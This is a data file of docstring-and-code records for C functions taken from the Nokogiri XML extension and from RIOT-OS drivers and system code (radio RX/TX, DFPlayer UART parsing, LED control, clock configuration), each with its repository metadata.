{"docstring": "/*\n * call-seq:\n *  native_write(chunk, last_chunk)\n *\n * Write +chunk+ to PushParser. +last_chunk+ triggers the end_document handle\n */\n", "func_signal": "static VALUE native_write(VALUE self, VALUE _chunk, VALUE _last_chunk)", "code": "{\n  xmlParserCtxtPtr ctx;\n  const char * chunk  = NULL;\n  int size            = 0;\n\n\n  Data_Get_Struct(self, xmlParserCtxt, ctx);\n\n  if (Qnil != _chunk) {\n    chunk = StringValuePtr(_chunk);\n    size = (int)RSTRING_LEN(_chunk);\n  }\n\n  if (xmlParseChunk(ctx, chunk, size, Qtrue == _last_chunk ? 1 : 0)) {\n    if (!(ctx->options & XML_PARSE_RECOVER)) {\n      xmlErrorPtr e = xmlCtxtGetLastError(ctx);\n      Nokogiri_error_raise(NULL, e);\n    }\n  }\n\n  return self;\n}", "path": "nokogiri/ext/nokogiri/xml_sax_push_parser.c", "commit_date": "2017-01-15 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n *  call-seq:\n *    delete(node)\n *\n *  Delete +node+ from the Nodeset, if it is a member. Returns the deleted node\n *  if found, otherwise returns nil.\n */\n", "func_signal": "static VALUE\ndelete(VALUE self, VALUE rb_node)", "code": "{\n  xmlNodeSetPtr node_set;\n  xmlNodePtr node;\n\n  Check_Node_Set_Node_Type(rb_node);\n\n  Data_Get_Struct(self, xmlNodeSet, node_set);\n  Data_Get_Struct(rb_node, xmlNode, node);\n\n  if (xmlXPathNodeSetContains(node_set, node)) {\n    xpath_node_set_del(node_set, node);\n    return rb_node;\n  }\n  return Qnil ;\n}", "path": "nokogiri/ext/nokogiri/xml_node_set.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n * call-seq:\n *  length\n *\n * Get the length of the node set\n */\n", "func_signal": "static VALUE length(VALUE self)", "code": "{\n  xmlNodeSetPtr node_set;\n\n  Data_Get_Struct(self, xmlNodeSet, node_set);\n\n  return node_set ? INT2NUM(node_set->nodeNr) : INT2NUM(0);\n}", "path": "nokogiri/ext/nokogiri/xml_node_set.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n *  call-seq:\n *    unlink\n *\n * Unlink this NodeSet and all Node objects it contains from their current context.\n */\n", "func_signal": "static VALUE unlink_nodeset(VALUE self)", "code": "{\n  xmlNodeSetPtr node_set;\n  int j, nodeNr ;\n\n  Data_Get_Struct(self, xmlNodeSet, node_set);\n\n  nodeNr = node_set->nodeNr ;\n  for (j = 0 ; j < nodeNr ; j++) {\n    if (! NOKOGIRI_NAMESPACE_EH(node_set->nodeTab[j])) {\n      VALUE node ;\n      xmlNodePtr node_ptr;\n      node = Nokogiri_wrap_xml_node(Qnil, node_set->nodeTab[j]);\n      rb_funcall(node, rb_intern(\"unlink\"), 0); /* modifies the C struct out from under the object */\n      Data_Get_Struct(node, xmlNode, node_ptr);\n      node_set->nodeTab[j] = node_ptr ;\n    }\n  }\n  return self ;\n}", "path": "nokogiri/ext/nokogiri/xml_node_set.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n * call-seq:\n *  [index] -> Node or nil\n *  [start, length] -> NodeSet or nil\n *  [range] -> NodeSet or nil\n *  slice(index) -> Node or nil\n *  slice(start, length) -> NodeSet or nil\n *  slice(range) -> NodeSet or nil\n *\n * Element reference - returns the node at +index+, or returns a NodeSet\n * containing nodes starting at +start+ and continuing for +length+ elements, or\n * returns a NodeSet containing nodes specified by +range+. Negative +indices+\n * count backward from the end of the +node_set+ (-1 is the last node). Returns\n * nil if the +index+ (or +start+) are out of range.\n */\n", "func_signal": "static VALUE slice(int argc, VALUE *argv, VALUE self)", "code": "{\n  VALUE arg ;\n  long beg, len ;\n  xmlNodeSetPtr node_set;\n\n  Data_Get_Struct(self, xmlNodeSet, node_set);\n\n  if (argc == 2) {\n    beg = NUM2LONG(argv[0]);\n    len = NUM2LONG(argv[1]);\n    if (beg < 0) {\n      beg += node_set->nodeNr ;\n    }\n    return subseq(self, beg, len);\n  }\n\n  if (argc != 1) {\n    rb_scan_args(argc, argv, \"11\", NULL, NULL);\n  }\n  arg = argv[0];\n\n  if (FIXNUM_P(arg)) {\n    return index_at(self, FIX2LONG(arg));\n  }\n\n  /* if arg is Range */\n  switch (rb_range_beg_len(arg, &beg, &len, (long)node_set->nodeNr, 0)) {\n  case Qfalse:\n    break;\n  case Qnil:\n    return Qnil;\n  default:\n    return subseq(self, beg, len);\n  }\n\n  return index_at(self, NUM2LONG(arg));\n}", "path": "nokogiri/ext/nokogiri/xml_node_set.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n * call-seq:\n *  |(node_set)\n *\n * Returns a new set built by merging the set and the elements of the given\n * set.\n */\n", "func_signal": "static VALUE set_union(VALUE self, VALUE rb_other)", "code": "{\n  xmlNodeSetPtr node_set, other;\n  xmlNodeSetPtr new;\n\n  if(!rb_obj_is_kind_of(rb_other, cNokogiriXmlNodeSet))\n    rb_raise(rb_eArgError, \"node_set must be a Nokogiri::XML::NodeSet\");\n\n  Data_Get_Struct(self, xmlNodeSet, node_set);\n  Data_Get_Struct(rb_other, xmlNodeSet, other);\n\n  new = xmlXPathNodeSetMerge(NULL, node_set);\n  new = xmlXPathNodeSetMerge(new, other);\n\n  return Nokogiri_wrap_xml_node_set(new, rb_iv_get(self, \"@document\"));\n}", "path": "nokogiri/ext/nokogiri/xml_node_set.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n * call-seq:\n *  content\n *\n * Get the content\n */\n", "func_signal": "static VALUE get_content(VALUE self)", "code": "{\n  xmlEntityPtr node;\n  Data_Get_Struct(self, xmlEntity, node);\n\n  if(!node->content) return Qnil;\n\n  return NOKOGIRI_STR_NEW(node->content, node->length);\n}", "path": "nokogiri/ext/nokogiri/xml_entity_decl.c", "commit_date": "2010-04-07 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n * call-seq:\n *  external_id\n *\n * Get the external identifier for PUBLIC\n */\n", "func_signal": "static VALUE external_id(VALUE self)", "code": "{\n  xmlEntityPtr node;\n  Data_Get_Struct(self, xmlEntity, node);\n\n  if(!node->ExternalID) return Qnil;\n\n  return NOKOGIRI_STR_NEW2(node->ExternalID);\n}", "path": "nokogiri/ext/nokogiri/xml_entity_decl.c", "commit_date": "2010-04-07 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n * call-seq:\n *  -(node_set)\n *\n *  Difference - returns a new NodeSet that is a copy of this NodeSet, removing\n *  each item that also appears in +node_set+\n */\n", "func_signal": "static VALUE minus(VALUE self, VALUE rb_other)", "code": "{\n  xmlNodeSetPtr node_set, other;\n  xmlNodeSetPtr new;\n  int j ;\n\n  if(!rb_obj_is_kind_of(rb_other, cNokogiriXmlNodeSet))\n    rb_raise(rb_eArgError, \"node_set must be a Nokogiri::XML::NodeSet\");\n\n  Data_Get_Struct(self, xmlNodeSet, node_set);\n  Data_Get_Struct(rb_other, xmlNodeSet, other);\n\n  new = xmlXPathNodeSetMerge(NULL, node_set);\n  for (j = 0 ; j < other->nodeNr ; ++j) {\n    xpath_node_set_del(new, other->nodeTab[j]);\n  }\n\n  return Nokogiri_wrap_xml_node_set(new, rb_iv_get(self, \"@document\"));\n}", "path": "nokogiri/ext/nokogiri/xml_node_set.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n * call-seq:\n *  push(node)\n *\n * Append +node+ to the NodeSet.\n */\n", "func_signal": "static VALUE push(VALUE self, VALUE rb_node)", "code": "{\n  xmlNodeSetPtr node_set;\n  xmlNodePtr node;\n\n  Check_Node_Set_Node_Type(rb_node);\n\n  Data_Get_Struct(self, xmlNodeSet, node_set);\n  Data_Get_Struct(rb_node, xmlNode, node);\n\n  xmlXPathNodeSetAdd(node_set, node);\n\n  return self;\n}", "path": "nokogiri/ext/nokogiri/xml_node_set.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/*\n * call-seq:\n *  include?(node)\n *\n *  Returns true if any member of node set equals +node+.\n */\n", "func_signal": "static VALUE include_eh(VALUE self, VALUE rb_node)", "code": "{\n  xmlNodeSetPtr node_set;\n  xmlNodePtr node;\n\n  Check_Node_Set_Node_Type(rb_node);\n\n  Data_Get_Struct(self, xmlNodeSet, node_set);\n  Data_Get_Struct(rb_node, xmlNode, node);\n\n  return (xmlXPathNodeSetContains(node_set, node) ? Qtrue : Qfalse);\n}", "path": "nokogiri/ext/nokogiri/xml_node_set.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "sparklemotion/nokogiri", "stars": 6093, "license": "mit", "language": "c", "size": 37211}
{"docstring": "/**\n * @brief   Parse the frame received from the DFPlayer Mini\n *\n * @param   dev     Device descriptor of the DFPlayer the frame received from\n *\n * The frame is stored in the buffer of the device descriptor\n */\n", "func_signal": "static void _parse_frame(dfplayer_t *dev)", "code": "{\n    assert(dev->len == DFPLAYER_LEN);\n    switch (dev->buf[0] & DFPLAYER_CLASS_MASK) {\n        case DFPLAYER_CLASS_NOTIFY:\n            _handle_event_notification(dev);\n            return;\n        case DFPLAYER_CLASS_RESPONSE:\n            /* Unblock thread waiting for response */\n            mutex_unlock(&dev->sync);\n            return;\n    }\n\n    DEBUG(\"[dfplayer] Got frame of unknown class\\n\");\n}", "path": "RIOT/drivers/dfplayer/dfplayer_internal.c", "commit_date": "2020-11-05 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/**********************************************************************\n * internal API implementation\n **********************************************************************/\n", "func_signal": "void _native_rng_init_det(void)", "code": "{\n    DEBUG(\"_native_rng_init_det\\n\");\n    _native_syscall_enter();\n    real_srandom(_native_rng_seed);\n    _native_syscall_leave();\n}", "path": "RIOT/cpu/native/periph/hwrng.c", "commit_date": "2020-10-22 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/**\n * @brief   Refill the TX-FIFO\n *\n * @param   dev     Device descriptor of the transceiver\n */\n", "func_signal": "static netdev_event_t cc110x_tx_continue(cc110x_t *dev)", "code": "{\n    uint8_t in_fifo;\n\n    cc110x_read_reliable(dev, CC110X_REG_TXBYTES, &in_fifo);\n\n    /* most significant bit indicates TXFIFO underflow, see page 94 in the\n     * data sheet\n     */\n    if (in_fifo & 0x80) {\n        DEBUG(\"[cc110x] ISR: ERROR: TX-FIFO underflown, ISR too slow\\n\");\n        /* Abort: Flush TX and go back to RX */\n        cc110x_cmd(dev, CC110X_STROBE_IDLE);\n        cc110x_cmd(dev, CC110X_STROBE_FLUSH_TX);\n        cc110x_enter_rx_mode(dev);\n        return NETDEV_EVENT_TX_TIMEOUT;\n    }\n\n    uint8_t to_write = CC110X_FIFO_SIZE - in_fifo;\n\n    if (to_write == 0) {\n        /* ISR came to early, nothing to do yet */\n        return NETDEV_NO_EVENT;\n    }\n\n    uint8_t left = dev->buf.len - dev->buf.pos;\n    to_write = (left < to_write) ? left : to_write;\n\n    cc110x_burst_write(dev, CC110X_MULTIREG_FIFO,\n                       dev->buf.data + dev->buf.pos, to_write);\n    dev->buf.pos += to_write;\n\n    if (dev->buf.pos == dev->buf.len) {\n        /* All data send to the transceiver, now waiting for transceiver to\n         * complete transmission\n         */\n        dev->state = CC110X_STATE_TX_COMPLETING;\n        /* Disable GDO2, as we do not need to further feed TX FIFO */\n        cc110x_write(dev, CC110X_REG_IOCFG2, CC110X_GDO_CONSTANT_LOW);\n    }\n\n    return NETDEV_NO_EVENT;\n}", "path": "RIOT/drivers/cc110x/cc110x_rx_tx.c", "commit_date": "2020-10-22 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/**\n * @brief   Parse the bootup completed frame and init available sources\n *\n * @param   dev     DFPlayer device descriptor\n */\n", "func_signal": "static void _handle_bootup_completed(dfplayer_t *dev)", "code": "{\n    if (dev->buf[3] & DFPLAYER_MASK_USB) {\n        dev->srcs |= 0x01 << DFPLAYER_SOURCE_USB;\n    }\n\n    if (dev->buf[3] & DFPLAYER_MASK_SDCARD) {\n        dev->srcs |= 0x01 << DFPLAYER_SOURCE_SDCARD;\n    }\n\n    if (dev->buf[3] & DFPLAYER_MASK_FLASH) {\n        dev->srcs |= 0x01 << DFPLAYER_SOURCE_FLASH;\n    }\n\n    /* Unblock caller of dfplayer_reset() */\n    mutex_unlock(&dev->sync);\n}", "path": "RIOT/drivers/dfplayer/dfplayer_internal.c", "commit_date": "2020-11-05 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/**\n * @brief Load data into the latch register of the LED controller\n */\n", "func_signal": "static void _latch(my9221_t *dev)", "code": "{\n    assert(dev);\n\n    gpio_clear(PIN_DAT);\n    xtimer_usleep(MY9221_LATCH_WAIT);\n\n    for (unsigned i = 0; i < MY9221_LATCH_LOOP; ++i) {\n        gpio_set(PIN_DAT);\n        gpio_clear(PIN_DAT);\n    }\n}", "path": "RIOT/drivers/my9221/my9221.c", "commit_date": "2019-01-10 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/**\n * @brief   Read a chunk of data from the RX-FIFO\n *\n * @param   dev     Device descriptor of the transceiver\n *\n * This function should be called from the ISR when data in the RX-FIFO is\n * available or the last byte of the frame was received\n */\n", "func_signal": "static netdev_event_t cc110x_rx_continue(cc110x_t *dev)", "code": "{\n    uint8_t in_fifo;\n    netdev_event_t retval = NETDEV_NO_EVENT;\n\n    while (gpio_read(dev->params.gdo2)) {\n        cc110x_read_reliable(dev, CC110X_REG_RXBYTES, &in_fifo);\n\n        if (in_fifo & 0x80) {\n            /* RXFIFO_OVERFLOW bit is set (see RXBYTES on page 94) */\n            DEBUG(\"[cc110x] ISR: RX-FIFO overflown, ISR too slow\\n\");\n            /* Drop frame and go to RX */\n            cc110x_enter_rx_mode(dev);\n            return NETDEV_EVENT_RX_TIMEOUT;\n        }\n\n        if (!in_fifo) {\n            /* GDO2 will be high when data is present *or* at end of packet */\n            break;\n        }\n\n        /* Handle first read from RX FIFO differently from subsequent reads, as\n         * in first reads the Length Field is read as well\n         */\n        if (!dev->buf.len) {\n            if (in_fifo < sizeof(cc1xxx_l2hdr_t) + 1) {\n                /* At least a frame header + Length Field (1B) is expected */\n                DEBUG(\"[cc110x] ISR: Incoming frame smaller than header \"\n                      \"--> drop\\n\");\n                cc110x_enter_rx_mode(dev);\n                /* Not exactly CRC, but incorrect CRC indicates a broken frame*/\n                return NETDEV_EVENT_CRC_ERROR;\n            }\n            cc110x_burst_read(dev, CC110X_MULTIREG_FIFO, &dev->buf,\n                              in_fifo - 1);\n            /* Update read position in payload, that is number of bytes read\n             * minus the Length Filed and minus the byte left in the FIFO to not\n             * trigger a silicon bug\n             */\n            dev->buf.pos = in_fifo - 2;\n            retval = NETDEV_EVENT_RX_STARTED;\n        }\n        else {\n            /* Prevent overflow of buffer */\n            if (dev->buf.pos + in_fifo > CC110X_MAX_FRAME_SIZE) {\n                DEBUG(\"[cc110x] ISR: Incoming frame exceeds maximum size\\n\");\n                cc110x_enter_rx_mode(dev);\n                /* Not exactly CRC, but incorrect CRC indicates a broken frame */\n                return NETDEV_EVENT_CRC_ERROR;\n            }\n\n            if (dev->buf.pos + in_fifo < dev->buf.len) {\n                /* Frame not fully received yet, keeping one byte in RX FIFO\n                 * to prevent triggering a silicon bug\n                 */\n                in_fifo--;\n            }\n\n            /* Continue reading data */\n            cc110x_burst_read(dev, CC110X_MULTIREG_FIFO,\n                              dev->buf.data + dev->buf.pos, in_fifo);\n            dev->buf.pos += in_fifo;\n\n        }\n    }\n\n    if (dev->buf.pos > dev->buf.len) {\n        DEBUG(\"[cc110x] ISR: Incoming frame larger than Length Field \"\n              \"--> drop\\n\");\n        cc110x_enter_rx_mode(dev);\n        /* Not exactly CRC, but incorrect CRC indicates a broken frame */\n        return NETDEV_EVENT_CRC_ERROR;\n    }\n\n    if (!gpio_read(dev->params.gdo0)) {\n        /* GDO0 is low when transmission is over ==> RX complete or corrupt\n           frame */\n        if (dev->buf.pos == dev->buf.len) {\n            return cc110x_rx_done(dev);\n        }\n        else {\n            DEBUG(\"[cc110x] ISR: Incoming frame smaller than Length Field \"\n                  \"--> drop\\n\");\n            cc110x_enter_rx_mode(dev);\n            /* Not exactly CRC, but incorrect CRC indicates a broken frame */\n            return NETDEV_EVENT_CRC_ERROR;\n        }\n    }\n\n    return retval;\n}", "path": "RIOT/drivers/cc110x/cc110x_rx_tx.c", "commit_date": "2020-10-22 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/* starts OpenThread thread */\n", "func_signal": "int openthread_netdev_init(char *stack, int stacksize, char priority,\n                           const char *name, netdev_t *netdev)", "code": "{\n    if (thread_create(stack, stacksize,\n                         priority, THREAD_CREATE_STACKTEST,\n                         _openthread_event_loop, netdev, name) < 0) {\n        return -EINVAL;\n    }\n\n    return 0;\n}", "path": "RIOT/pkg/openthread/contrib/netdev/openthread_netdev.c", "commit_date": "2020-10-23 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/**\n * @brief   Function called when a byte was received over UART (ISR-context)\n *\n * @param   _dev    The corresponding device descriptor\n * @param   data    The received byte of data\n */\n", "func_signal": "void dfplayer_uart_rx_cb(void *_dev, uint8_t data)", "code": "{\n    dfplayer_t *dev = _dev;\n    switch (dev->state) {\n        case DFPLAYER_RX_STATE_START:\n            if (data == DFPLAYER_START) {\n                dev->state = DFPLAYER_RX_STATE_VERSION;\n                return;\n            }\n            break;\n        case DFPLAYER_RX_STATE_VERSION:\n            if (data == DFPLAYER_VERSION) {\n                dev->state = DFPLAYER_RX_STATE_LENGTH;\n                return;\n            }\n            break;\n        case DFPLAYER_RX_STATE_LENGTH:\n            if (data == DFPLAYER_LEN) {\n                dev->len = 0;\n                dev->state = DFPLAYER_RX_STATE_DATA;\n                return;\n            }\n            else {\n                DEBUG(\"[dfplayer] Got frame with length %\" PRIu8 \", but all \"\n                      \"frames should have length 6\\n\", data);\n            }\n            break;\n        case DFPLAYER_RX_STATE_DATA:\n            /* We are a bit more liberal here and allow the end symbol to\n             * appear in the payload of the frame, as the data sheet does not\n             * mention any sort of escaping to prevent it from appearing in the\n             * frame's payload. If bytes get lost and an and of frame symbol\n             * is mistaken for a payload byte, this will be almost certainly\n             * detected, as additionally a second end of frame symbol would\n             * need to appear at the right position *and* the frame check\n             * sequence need to match\n             */\n            if ((data == DFPLAYER_END) && (dev->len == DFPLAYER_LEN)) {\n                uint16_t fcs_exp = fcs_init;\n                fcs_exp -= dev->buf[0] + dev->buf[1] + dev->buf[2] + dev->buf[3];\n                uint16_t fcs = (((uint16_t)dev->buf[4]) << 8) | dev->buf[5];\n                if (fcs == fcs_exp) {\n                    DEBUG(\"[dfplayer] Got 0x%02x, 0x%02x, 0x%02x, 0x%02x\\n\",\n                          dev->buf[0], dev->buf[1], dev->buf[2],\n                          dev->buf[3]);\n                    _parse_frame(dev);\n                }\n                else {\n                    DEBUG(\"[dfplayer] Checksum mismatch\");\n                }\n            }\n            else if (dev->len < sizeof(dev->buf)) {\n                dev->buf[dev->len++] = data;\n                return;\n            }\n            else {\n                DEBUG(\"[dfplayer] Frame overflown\\n\");\n            }\n            break;\n        default:\n            break;\n    }\n\n    dev->state = DFPLAYER_RX_STATE_START;\n}", "path": "RIOT/drivers/dfplayer/dfplayer_internal.c", "commit_date": "2020-11-05 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/**\n * @brief   Handle a notification message\n */\n", "func_signal": "static void _handle_event_notification(dfplayer_t *dev)", "code": "{\n    switch (dev->buf[0]) {\n        case DFPLAYER_NOTIFY_INSERT:\n            DEBUG(\"[dfplayer] Insert event\\n\");\n            {\n                dfplayer_source_t src = _get_inserted_ejected_source(dev);\n                if (src < DFPLAYER_SOURCE_NUMOF) {\n                    dev->srcs |= (dfplayer_source_set_t)(0x01 << src);\n                }\n            }\n            if (dev->cb_src) {\n                dev->cb_src(dev, dev->srcs);\n            }\n            return;\n        case DFPLAYER_NOTIFY_EJECT:\n            DEBUG(\"[dfplayer] Eject event\\n\");\n            {\n                dfplayer_source_t src = _get_inserted_ejected_source(dev);\n                if (src < DFPLAYER_SOURCE_NUMOF) {\n                    dev->srcs &= ~((dfplayer_source_set_t)(0x01 << src));\n                }\n            }\n            if (dev->cb_src) {\n                dev->cb_src(dev, dev->srcs);\n            }\n            return;\n        case DFPLAYER_NOTIFY_DONE_USB:\n            _handle_playback_completed(dev, DFPLAYER_SOURCE_USB);\n            return;\n        case DFPLAYER_NOTIFY_DONE_SDCARD:\n            _handle_playback_completed(dev, DFPLAYER_SOURCE_SDCARD);\n            return;\n        case DFPLAYER_NOTIFY_DONE_FLASH:\n            _handle_playback_completed(dev, DFPLAYER_SOURCE_FLASH);\n            return;\n        case DFPLAYER_NOTIFY_READY:\n            _handle_bootup_completed(dev);\n            return;\n        default:\n            DEBUG(\"[dfplayer] Unknown notification (%02x)\\n\", dev->buf[0]);\n    }\n}", "path": "RIOT/drivers/dfplayer/dfplayer_internal.c", "commit_date": "2020-11-05 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/* internal functions */\n", "func_signal": "static inline uint32_t _exp_backoff_retrans_timer(uint8_t ns_sent,\n                                                  uint32_t retrans_timer)", "code": "{\n    uint32_t factor = random_uint32_range(NDP_MIN_RANDOM_FACTOR,\n                                          NDP_MAX_RANDOM_FACTOR);\n\n    return _exp_backoff_retrans_timer_factor(ns_sent, retrans_timer, factor);\n}", "path": "RIOT/sys/net/gnrc/network_layer/ipv6/nib/_nib-arsm.c", "commit_date": "2020-10-23 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/**\n * @brief   Function to run when frame is fully send\n *\n * @param   dev     Device descriptor of the transceiver\n */\n", "func_signal": "static netdev_event_t cc110x_tx_done(cc110x_t *dev)", "code": "{\n    uint8_t status = cc110x_status(dev);\n    cc110x_state_t state = cc110x_state_from_status(status);\n    switch (state){\n        case CC110X_STATE_SETTLING:\n        case CC110X_STATE_CALIBRATE:\n        case CC110X_STATE_TX_MODE:\n            /* TX still in progress, or hasn't even started yet */\n            return NETDEV_NO_EVENT;\n        case CC110X_STATE_IDLE:\n            cc110x_enter_rx_mode(dev);\n            return NETDEV_EVENT_TX_COMPLETE;\n        case CC110X_STATE_TXFIFO_UNDERFLOW:\n            DEBUG(\"[cc110x] ISR: TX FIFO underflown.\\n\");\n            break;\n        default:\n            DEBUG(\"[cc110x] ISR: Unknown state during TX.\\n\");\n            break;\n    }\n\n    cc110x_enter_rx_mode(dev);\n    /* TX timeout is the only TX-related error event known to RIOT */\n    return NETDEV_EVENT_TX_TIMEOUT;\n}", "path": "RIOT/drivers/cc110x/cc110x_rx_tx.c", "commit_date": "2020-10-22 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/**\n * @brief Write state data of all LEDs to the controller\n */\n", "func_signal": "static void _set_state(my9221_t *dev)", "code": "{\n    assert(dev);\n\n    _write(dev, MY9221_CMDMODE);\n    for (unsigned i = 0; i < DEV_LEDS; ++i) {\n        if (DEV_DIR == MY9221_DIR_REV) {\n            /* Write LED state in reverse order */\n            _write(dev, DEV_STATE(DEV_LEDS-i-1));\n        }\n        else {\n            /* Write LED state in forward order */\n            _write(dev, DEV_STATE(i));\n        }\n    }\n    /* set unused LED pins to off */\n    for (unsigned j = DEV_LEDS; j < MY9221_LED_MAX; ++j) {\n        _write(dev, MY9221_LED_OFF);\n    }\n\n    _latch(dev);\n}", "path": "RIOT/drivers/my9221/my9221.c", "commit_date": "2019-01-10 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/* Set up clock speed configuration. See cpu_conf.h for details about the\n * different clock options. */\n", "func_signal": "void cpu_clock_init(void)", "code": "{\n    /* Set up external clock frequency. */\n#if CONFIG_BOARD_HAS_XTAL\n#if CONFIG_BOARD_HAS_XTAL_32M\n    CLOCK_AttachClk(k32M_to_XTAL_CLK);    /* Switch XTAL_CLK to 32M */\n#elif CONFIG_BOARD_HAS_XTAL_16M\n    CLOCK_AttachClk(k16M_to_XTAL_CLK);    /* Switch XTAL_CLK to 16M */\n#else\n#error \"One of the CONFIG_BOARD_XTAL_* must be set.\"\n#endif\n#endif /* CONFIG_BOARD_HAS_XTAL */\n\n\n    /* Set up 32K clock source. */\n#if CONFIG_CPU_CLK_32K_XTAL\n    CLOCK_AttachClk(kXTAL32K_to_32K_CLK); /* Switch 32K_CLK to XTAL32K */\n#elif CONFIG_CPU_CLK_32K_RCO\n    CLOCK_AttachClk(kRCO32K_to_32K_CLK);  /* Switch 32K_CLK to RCO32K */\n#else\n#error \"One of the CONFIG_CPU_CLK_32K_* must be set.\"\n#endif\n\n    /* Set up System clock source. */\n#if CONFIG_CPU_CLK_SYS_XTAL\n    CLOCK_AttachClk(kXTAL_to_SYS_CLK);    /* Switch SYS_CLK to XTAL */\n#elif CONFIG_CPU_CLK_SYS_OSC32M\n    CLOCK_AttachClk(kOSC32M_to_SYS_CLK);  /* Switch SYS_CLK to OSM32M */\n#elif CONFIG_CPU_CLK_SYS_32K\n    CLOCK_AttachClk(k32K_to_SYS_CLK);     /* Switch SYS_CLK to 32K source */\n#else\n#error \"One of the CONFIG_CPU_CLK_SYS_* must be set.\"\n#endif\n\n    /* Run the WDT from the APB always. */\n    CLOCK_AttachClk(kAPB_to_WDT_CLK);\n\n    /* Set up dividers */\n\n    /* Set OSC32M_DIV divider */\n#if CONFIG_CPU_CLK_OSC32M_DIV != 0 && CONFIG_CPU_CLK_OSC32M_DIV != 1\n#error \"Invalid CONFIG_CPU_CLK_OSC32M_DIV value\"\n#endif\n    /* Note: The denominator is set to (CONFIG_CPU_CLK_OSC32M_DIV + 1), so /2\n     * when the macro is enabled. */\n    CLOCK_SetClkDiv(kCLOCK_DivOsc32mClk, CONFIG_CPU_CLK_OSC32M_DIV);\n\n    /* Set XTAL_DIV divider */\n#if CONFIG_CPU_CLK_XTAL_DIV != 0 && CONFIG_CPU_CLK_XTAL_DIV != 1\n#error \"Invalid CONFIG_CPU_CLK_XTAL_DIV value\"\n#endif\n    CLOCK_SetClkDiv(kCLOCK_DivXtalClk, CONFIG_CPU_CLK_XTAL_DIV);\n\n    /* Set AHB_DIV divider. */\n#if CONFIG_CPU_CLK_AHB_DIV < 1 || CONFIG_CPU_CLK_AHB_DIV > 8192\n#error \"Invalid CONFIG_CPU_CLK_AHB_DIV\"\n#endif\n    CLOCK_SetClkDiv(kCLOCK_DivAhbClk, CONFIG_CPU_CLK_AHB_DIV - 1u);\n\n    /* Set APB_DIV divider. */\n#if CONFIG_CPU_CLK_APB_DIV < 1 || CONFIG_CPU_CLK_APB_DIV > 16\n#error \"Invalid CONFIG_CPU_CLK_APB_DIV\"\n#endif\n    CLOCK_SetClkDiv(kCLOCK_DivApbClk, CONFIG_CPU_CLK_APB_DIV - 1u);\n}", "path": "RIOT/cpu/qn908x/cpu.c", "commit_date": "2020-12-02 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
{"docstring": "/**\n * @brief Check if N/P pair is valid\n *\n * Check if N/P (alternatively N/Q or N/R) pair is valid with given @p vco_in and\n * @p pll_out\n *\n * @param[in] n\n * @param[in] p\n * @param[in] vco_in\n * @param[in] pll_out\n *\n * @return 1 if pair is valid, 0 otherwise\n */\n", "func_signal": "static int is_n_ok(const pll_cfg_t *cfg, unsigned n, unsigned p,\n                   unsigned vco_in, unsigned pll_out)", "code": "{\n    if (n >= cfg->min_n && n <= cfg->max_n &&\n            vco_in * n >= cfg->min_vco_output && vco_in * n <= cfg->max_vco_output &&\n            vco_in * n / p == pll_out) {\n        return 1;\n    }\n    else {\n        return 0;\n    }\n}", "path": "RIOT/cpu/stm32/dist/clk_conf/clk_conf.c", "commit_date": "2020-11-13 00:00:00", "repo_name": "RIOT-OS/RIOT", "stars": 4742, "license": "lgpl-2.1", "language": "c", "size": 154890}
